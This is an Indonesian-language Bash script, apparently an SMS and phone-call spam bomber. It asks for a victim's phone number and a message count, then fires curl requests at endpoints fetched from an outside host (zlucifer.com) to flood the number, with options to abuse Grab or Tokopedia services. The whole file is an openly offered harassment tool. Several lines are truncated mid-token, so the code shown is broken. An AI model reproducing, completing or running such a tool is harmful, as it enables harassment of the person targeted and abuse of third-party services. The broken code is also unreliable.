#Script SpamCall Mr.Killer code
#Version 2.43
#Di buat tgl 19 bln juli 2019
#Oke Selamat Mencoba


}
get_sms=$(curl -s http://zlucifer.com/api/hackbae.php?request=s>
get_call=$(curl -s http://zlucifer.com/api/hackbae.php?request=>
mulai (){
    echo "Kembali ketik n gunakan lagi ketik y"
    echo "y/n?"
    echo
    read lagi
    if [ $lagi = "y" ]; then
            spam
    else
            echo "Terimakasih sudah menggunakan script ini"
    fi

}
#spam
spam(){
    clear
    troll
    echo
    echo "[1] Spam SMS"
    echo "[2] Spam Telp"
    echo "[3] Keluar"
    echo
    echo "1/2/3?"
    read pilih
    if [ $pilih = "1" ]; then
    echo "Troll Spam SMS"
            #function spam
            echo
            echo "Silahkan masukan nomor telp target"
            echo contoh 0812345678
            read target # masukin no telp
            echo
            echo "Berapa Spam yg ingin di kirim"
            read paket
            echo
            echo "Lanjut apa tidak sobat yakin anda jangan kejam">
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                    load
                    clear
                    echo Melakukan spam SMS ke nomor $target
                    echo
                    echo "Spam Belum terkirim butuh proses>"
                    echo "####################################>"
                    target_do=$get_sms'/sms.php?nomor='$target'>
                    CURL_RESPONSE=`curl -s -o /dev/null -w "%{h>
                    echo " Sukses Mengirim[✓]"
                    echo "Subscribe my channel donk"
                    echo " Jangan Gunakan sembarangan "
                    echo " Author Mr.Killer and thunderkiller"
                    echo "####################################>"
            else
                    echo "Kesalahan"
            fi
        mulai
    elif [ $pilih = "2" ]; then
            echo "SpamCall"
            #function spam
            echo
            echo "Silahkan masukan nomor telp target"
            echo contoh 0812345678
            read target # masukin no telp
            echo
            echo "Gunakan API Grab/Toped?"
            echo "[1] GRAB"
            echo "[2] TOPED"
            echo "1/2?"
            read api
            if [ $api = "1" ]; then
                  api_spam="grab"
            else
                  api_spam="toped"
            fi
            echo "Apakah anda yakin sobat>"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
            load
                    clear
                    echo Melakukan spam SMS ke nomor $target
                    echo
                    echo "Spam Belum terkirim butuh proses>"
                    echo "####################################>"
                    target_do=$get_sms'/sms.php?nomor='$target'>
                    CURL_RESPONSE=`curl -s -o /dev/null -w "%{h>
                    echo " Sukses Mengirim[✓]"
                    echo "Subscribe my channel donk"
                    echo " Jangan Gunakan sembarangan "
                    echo " Author Mr.Killer and thunderkiller"
                    echo "####################################>"
            else
                    echo "Kesalahan"
            fi
        mulai
    elif [ $pilih = "3" ]; then
        echo "Terimakasih telah menggunakan script kami"
        echo "Selamat Menjalan kan Aktivitas sobat (:"
        close
    else
        clear
        echo "Kesalahan"
        mulai
    fi



}
close(){
    exit
}
clear
echo "Loading.."
load
clear
troll
echo Hai saya Mr.Killer Mari saling kenal siapa nama kamu #tulisan keluar
read nick #membaca yang ditulis
clear
troll
echo halo sobat salam kenal $nick ":)"
echo
echo "Mulai ketik y keluar ketik n faham"
echo "y/n?"
read mulai
if [ $mulai = "y" ]; then
      spam
else
      close
fi
